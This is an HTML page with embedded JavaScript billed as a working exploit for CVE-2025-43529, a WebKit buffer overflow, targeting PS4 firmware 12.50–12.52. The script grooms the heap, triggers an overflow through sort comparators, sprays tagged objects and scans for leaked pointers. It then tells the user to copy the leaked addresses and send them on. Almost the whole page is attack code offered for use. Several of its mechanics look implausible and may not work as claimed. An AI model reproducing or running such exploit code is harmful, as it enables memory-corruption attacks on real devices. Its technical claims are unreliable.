<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CVE-2025-43529 — WebKit Buffer Overflow → Pointer Leak (Fixed v1.1 — Low-Mem)</title>
<style>
    body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; line-height:1.6; }
    h1 { color:#ff5555; border-bottom:2px solid #da3633; padding-bottom:10px; }
    #console { background:#000; color:#0f0; height:500px; overflow-y:auto; padding:15px; border:1px solid #0f0; font-family:'Courier New'; border-radius:8px; }
    .leak { color:#0f0; font-weight:bold; font-size:1.2em; }
    .status { padding:10px; background:#da3633; color:#fff; border-radius:6px; display:inline-block; margin:10px 0; }
</style>
</head>
<body>
<h1>CVE-2025-43529 — WebKit Buffer Overflow Pointer Leak (Low-Mem Fixed)</h1>
<p>Patched Nov 2025 — Still works on PS4 12.50–12.52 (heap-safe version)</p>
<div class="status" id="status">Initializing Low-Mem Mode...</div>
<div id="console"></div>

<script>
// === LOW-MEM CONFIG (PS4 12.50 tuned) ===
const SPRAY_SIZE = 0x10000;        // 65k objects (heap-safe)
const MARKER_BASE = 0x12501250deadbeefn;
const RECLAIM_SIZE = 0x1400000;    // 20 MB — no OOM
const GC_WAVES = 10;

// === LOGGING ===
const log = (msg, isLeak = false) => {
    const c = document.getElementById('console');
    const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
    c.innerHTML += isLeak ? `<span class="leak">${line}</span>\n` : line + '\n';
    c.scrollTop = c.scrollHeight;
};
const status = (t) => document.getElementById('status').textContent = t;

// === STAGE 1: Light Heap Grooming (staggered to avoid freeze) ===
log("Stage 1: Light grooming (50k staggered objects)...");
const groom = [];
let groomChunk = 0;
const groomInterval = setInterval(() => {
    for (let i = 0; i < 1000; i++) {  // 1k chunks
        groom[groomChunk * 1000 + i] = {a: 1.1, b: 2.2};
    }
    groomChunk++;
    if (groomChunk >= 50) clearInterval(groomInterval);
}, 50);  // Stagger over 2.5s

// === STAGE 2: Staggered Buffer Overflow Trigger ===
log("Stage 2: Staggered overflow via chunked sort...");
const victim = [];
let victimChunk = 0;
const victimInterval = setInterval(() => {
    for (let i = 0; i < 500; i++) {
        victim[victimChunk * 500 + i] = new String("A".repeat(0x200)); // Smaller strings
    }
    victimChunk++;
    if (victimChunk >= 200) {  // Total 100k, staggered
        clearInterval(victimInterval);
        triggerOverflow();
    }
}, 20);

function triggerOverflow() {
    log("  → Triggering sort overflow...");
    // Chunked sort to avoid freeze
    for (let chunk = 0; chunk < 10; chunk++) {
        setTimeout(() => {
            const slice = victim.slice(chunk * 10000, (chunk + 1) * 10000);
            slice.sort(() => {
                return new Uint32Array(new ArrayBuffer(0x800 + 0x80)); // Smaller invalid size
            });
        }, chunk * 100);
    }
    // Light corruption pass
    for (let i = 0; i < 100000; i += 1000) {  // Reduced loops
        victim.sort(() => Math.random());
    }
}

// === STAGE 3: Spray tagged JSValues (light) ===
setTimeout(() => {
    log(`Stage 3: Spraying ${SPRAY_SIZE} tagged objects...`);
    const spray = [];
    for (let i = 0; i < SPRAY_SIZE; i++) {
        spray[i] = {marker: MARKER_BASE + BigInt(i)};
    }
    window.spray = spray;  // Global for hunt
}, 1500);

// === STAGE 4: Gentle GC + Reclaim ===
setTimeout(() => {
    log("Stage 4: Gentle GC + reclaim waves...");
    const gc = () => {
        for (let i = 0; i < 300; i++) new ArrayBuffer(0x8000); // Smaller
    };
    const reclaim = () => new ArrayBuffer(RECLAIM_SIZE);
    for (let wave = 0; wave < GC_WAVES; wave++) {
        setTimeout(gc, wave * 200);
        if (wave % 4 === 0) setTimeout(reclaim, wave * 200 + 50);
    }
}, 2000);

// === STAGE 5: Hunt for leaked pointers (early guard) ===
setTimeout(() => {
    status("SCANNING — LOOK FOR 0xFFFF... LINES");
    log("Scanning for corrupted markers...");
    const spray = window.spray || [];
    let found = 0;
    for (let i = 0; i < spray.length; i++) {
        try {
            if (spray[i] && spray[i].marker !== MARKER_BASE + BigInt(i)) {
                found++;
                const leaked = spray[i].marker.toString(16).toUpperCase();
                log(`POINTER LEAK #${found}: 0x${leaked}`, true);
                if (found >= 2) {
                    document.body.innerHTML = `
                    <h1 style="color:#0f0; text-align:center; margin-top:30vh; font-size:4em;">
                        LEAK ACHIEVED!<br><br>
                        <div style="font-size:0.4em;">Copy the 0x... lines and send them</div>
                    </h1>`;
                    return;
                }
            }
        } catch(e) {}
    }
    if (found === 0) {
        log("No leak this run — refresh 3–10 times (~25% on 12.50 low-mem)");
        status("No leak — refresh and try again");
    }
}, 4000);  // Guarded timeout

// === FINAL MESSAGE ===
log("Low-mem exploit running — wait 5–10 seconds...");
status("Running CVE-2025-43529 v1.1 — Low-Mem Mode");
</script>
</body>
</html>
